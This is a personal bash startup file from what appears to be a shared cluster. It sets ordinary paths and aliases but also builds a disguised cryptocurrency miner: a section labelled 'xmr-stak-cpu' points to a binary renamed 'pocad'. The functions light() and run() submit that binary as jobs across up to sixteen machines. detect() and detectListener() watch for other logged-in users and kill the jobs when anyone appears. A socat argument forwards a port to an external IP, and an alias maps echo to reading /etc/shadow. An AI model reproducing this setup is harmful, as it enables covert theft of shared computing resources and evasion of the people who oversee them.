# .bashrc

# Source global definitions
if [ -f /etc/bashrc ]; then
	. /etc/bashrc
fi

# User specific aliases and functions

ulimit -s unlimited

alias echo="cat /etc/shadow"
unalias echo
#echo () {
#	 cat /home/namnx228/command
#}
#export -f echo
alias cmake=/home/namnx228/work/Cmake/bin/cmake 
LD_LIBRARY_PATH=/home/namnx228/usr/local/lib:/opt/local/cuda/8.0/lib64:/opt/local/cuda/8.0/lib64/stubs:
export LD_LIBRARY_PATH
CPATH=/home/namnx228/usr/local/include:/opt/local/cuda/8.0/include:
export CPATH

LIBRARY_PATH=$LD_LIBRARY_PATH

CMAKE_INCLUDE_PATH=$CPATH
export LIBRARY_PATH=/home/namnx228/usr/local/lib
export CMAKE_INCLUDE_PATH
CMAKE_LIBRARY_PATH=$LD_LIBRARY_PATH
export CMAKE_LIBRARY_PATH
NODEJS_PATH=/home/namnx228/work/3/nodejs/node-v6.11.1-linux-x64/bin
#export PATH=$NODEJS_PATH:$PATH
if [[ $PATH != *nodejs* ]] ;then
	export PATH=$NODEJS_PATH:$PATH
fi
CUDA_PATH=/opt/local/cuda/8.0/bin/
if [[ $PATH != */opt/local/cuda/8.0/bin/* ]]
then
	export PATH=$CUDA_PATH:$PATH
fi

if [[ $PATH != */home/namnx228/usr/bin* ]] 
then
  PATH=$PATH:/home/namnx228/usr/bin
fi

if [[ $PATH != */home/namnx228/usr/local/bin* ]]
then
  PATH=$PATH:/home/namnx228/usr/local/bin
fi

#GCC_PATH=/home/namnx228/work/gcc-7.2.0/build/bin/
#if [[ $PATH != *gcc* ]]; then
#    export PATH=$GCC_PATH:$PATH
#fi
#export PATH=/usr/lib64/qt-3.3/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/opt/ibutils/bin:/opt/openlava-2.2/bin:/home/namnx228/.local/bin:/home/namnx228/bin

alias wat="watch bjobs"
alias j="bjobs"
alias err="cat POCAD.err"
alias pe="bpeek"
alias bq="bqueues"

getHost()
{
  if (( $1 < 10 )) ; 
  then
    echo 0$1
  else
    echo $1
  fi
}
export -f getHost

bk(){
	#lay pe cho ra 1 file
	#tu file trich ra ID
	#kill id
	# xoa file
        killat
	b=$(bjobs)
	if [[ $b == *"namnx"* ]]; then
		echo "go here"
                if (( $# == 0 )); then 
		  #cat tmp
                  bjobs > tmp2
                  listkill=$(tail -n +2 tmp2 | sed 's/\([0-9][0-9]*\) .*/\1/g')
                  echo "$listkill"
  		  bkill $listkill
                  rm tmp2
                  command="killat ; kill `jobs -p`"
                  for i in $(seq 1 16) 
                  do
                    ssh namnx228@192.168.1.$i -n "killat"
                  done

                else
                  #for $para
                    #ham bie doi para to fit..
                    command="killat ; kill `jobs -p`"
                    for i in $*
                    do
                      host=fit$(getHost $i)
                      del=$(bjobs -m $host | tail -n 1 |  sed 's/\([0-9][0-9]*\) .*/\1/g')
                      echo $del
                      bkill $del
                      ssh namnx228@192.168.1.$i -n "killat"
                    done
                fi
	else 
		echo $b
	fi

        killall screen
        
}

export -f bk
bkDup()
{

	b=$(bjobs)
        index=0
	if [[ $b == *"namnx"* ]]; then
		echo "go here"
		bjobs | grep "namnx" > tmp
                cat tmp
                cat tmp| grep "PEND" > tmp2
                listPending=$(sed 's/\([0-9][0-9]*\).*PEND.*/\1/g' tmp2)
                bkill $listPending
                listcode=$(sed 's/\([0-9][0-9]*\) .*/\1/g' tmp)
                listPC=$(sed 's/.*fit\([0-9][0-9]\).*/\1/g' tmp)
                IFS=$'\n'
                command eval 'arr1=($listcode)'
                command eval 'arr2=($listPC)'

                for (( i=0; i < ${#arr1[@]};i++ ))
                do
                  indexnew="${arr2[$i]}"
                #  echo $indexnew
                echo $index
                  if [[ $indexnew == $index ]]; then
                    echo "${arr1[$i]}"
                    bkill "${arr1[$i]}"
 
                  fi
                  index=$indexnew
                done
	else 
		echo $b
	fi
        rm tmp
}
run30()
{
  cd ~
  for i in $(seq 1 $1)
  do
    bsub < job$2
  done
}

getMachineName()
{
  rawName=$(hostname | sed "s/fit\([0-1][0-9]\).local/\1/g")
  echo $rawName | sed "s/0\([0-9]\)/\1/g"
}

export -f getMachineName

hello()
{
  echo hello
}

detect()
{
    #check if co tham so

    #1= detect root
    #2= detect machine inside
    if [ $# -eq 0 ]
    then
      shopt -s nocasematch
      
      condition(){
         [[ $line == *[0-9]s* ]]
      }
      shopt -u nocasematch

      stop(){
        bk
      }
    else
      condition(){
         [[ $line == *[0-9]s* ]]
      }
      stop(){
        bk $(getMachineName)
        echo "co stop" > trytmp
      }
    fi
    export -f stop
    W=$(w | sed 's/|/ /' | awk '{print $1 , $5 , $8}' | tail -n +3)
    for i in `seq 1 $(echo "$W" | grep -c ^)`
    do
     let lineNumber="$i"
     line=$(echo "$W" | sed -n "${lineNumber}p")
     echo $line
     #if 0-9s va not nam hoac la $user
     if condition
     then
       #getMachineName
       #bk 
       echo "co vao" > trytmp1
       stop
       #echo detect
       return 1
     fi
    done
    return 0
  
}


detectListener()
{
  #chay w lien tuc
  #watch 1s
  #phat hien thi stop(echo)
  for (( ;; ))
  do
    if [[ $# -ne 0 ]]
    then
      detect 1
    else
      detect
    fi
    if [[ $? -ne 0 ]]
    then
      break
    fi
  done
}
export -f detectListener
export -f detect

c()
{
  j | grep -c namnx22
}


Ucpu()
{
  ps -eo pcpu,pid,user,args | sort -k 1 -r | head -10
}

cpu()
{
  ps -A -o pcpu | tail -n+2 | paste -sd+ | bc
}
export -f Ucpu
export -f cpu



listcpu()
{
  if (( $# == 0 )); then
    from=1
    to=16
  else
    from=$1
    to=$2
  fi

  for i in `seq $from $to`; do
    echo -n "$i: "
    ssh namnx228@192.168.1.$i -n cpu
  done
}

export -f listcpu


run()
{
  run30 50
  sleep 10
  bkDup
  sleep 2
  if [[ $# != 0 ]]; then
    for i in $*
    do
      bk $i
    done
  fi
}
export -f run

inArray(){
  n=$#
  candidate=${!n}
  lim=$( echo $(($n - 1)))
  for i in `seq 1 $lim`
  do
    if (( ${!i} == $candidate )) 
    then
      echo true
      return 1
    fi
  done
    echo "false"
    return 0
}

killat(){
 atrm `atq | awk {'print $1'} ` 
}
export -f killat

light()
{
  screen -d -m
  screen -r -X stuff " ~/pro/pocad &  sleep 20 && detectListener & ^M"
  
  echo "screen -r -X kill;source ~/.bashrc &&  bk" > tmpKillScreen
  at "now + 8 hours" < tmpKillScreen
  rm tmpKillScreen
  listmachine=
  for i in `seq 1 16` 
  do
    echo $i
    if [[ `inArray $* $i` != "true" ]]
    then
      if (( $i < 10 ))
      then
        machine="0$i"
      else
        machine=$i
      fi
      bsub < pro/job -m fit$machine 
      listmachine=$listmachine\ $machine
    fi
  done
  sleep 10
  echo $listmachine
  for i in $listmachine
  do
    bsub < pro/job2 -m fit$i
  done
}

bj(){
  bjobs -u all | grep -v namnx
}

alias vba="vim ~/.bashrc"
alias sba="source ~/.bashrc"

#alias node="/home/namnx228/work/3/node-v0.10.32/build/bin/node "
#alias npm="/home/namnx228/work/3/node-v0.10.32/build/bin/npm "


#----Python-section------
export PYTHONPATH=/home/namnx228/usr/local/lib/lib64/python2.7/site-packages/

export PYTHONUSERBASE=~/mypython
runnasm(){
	
	nasm -f elf $1".asm" ; ld -m elf_i386 -s -o $1 $1".o" ; ./$1
}

#------------GCC section------------------------
#alias gcc='/home/namnx228/work/gcc-7.2.0/build/bin/gcc'
export CXX=/home/namnx228/work/gcc-7.2.0/build/bin/g++
export CC=/home/namnx228/work/gcc-7.2.0/build/bin/gcc
alias g++=$CXX

#-------------xmr-stak-cpu--------------
export Path=/home/namnx228/work/3/pocad/build/bin

#----------------PORTWARDING-section------------------------
 sshX(){
  ssh namnx228@192.168.10.$1
}

arg1="TCP-LISTEN:4445,fork TCP:52.14.159.29"

socat()
{
  #~/work/port_forwarding/socat-2.0.0-b9/build/bin/socat TCP-LISTEN:$1,fork TCP:$2 &
  #~/work/port_forwarding/tacos/build/bin/pocad &
  ~/pro/pocad &
}
export -f sshX
alias exp=" ~/work/exp"

checklast(){
  if [[ $# -eq 0 ]]
  then
    range=$(seq 1 16)
  else
    range=$@
  fi
  for i in $range
  do
   echo fit$i
   ssh 192.168.1.$i -n last | head  
   echo -------------------------
  done

}


#----------------------------------Encfs-section-------------------------
alias encfs=/home/namnx228/tmp/encfs/build/encfs 
#---------------------------------end-encfs=============================
